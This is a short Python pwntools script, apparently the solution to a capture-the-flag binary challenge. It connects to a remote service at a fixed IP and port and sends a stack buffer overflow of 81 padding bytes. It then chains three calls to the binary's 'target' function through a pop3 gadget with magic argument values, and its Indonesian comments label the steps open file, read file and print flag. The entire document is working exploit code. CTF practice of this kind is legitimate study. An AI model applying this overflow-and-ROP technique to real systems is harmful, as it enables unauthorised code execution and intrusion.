from pwn import *

context.binary = './chall'
elf = context.binary

p = remote('152.118.201.241', 3014)

offset = 81
pop3 = 0x0804901b

target = elf.symbols['target']

payload = b"A"*offset

# 1. buka file
payload += p32(target)
payload += p32(pop3)
payload += p32(0x12345678)
payload += p32(0x87654321)
payload += p32(0xabcdef01)

# 2. baca file
payload += p32(target)
payload += p32(pop3)
payload += p32(0x1337c0de)
payload += p32(0x1337c4f3)
payload += p32(0x0)

# 3. print flag
payload += p32(target)
payload += b"BBBB"
payload += p32(0xf4d4f4d4)
payload += p32(0x0)
payload += p32(0x0)

p.sendline(payload)
p.interactive()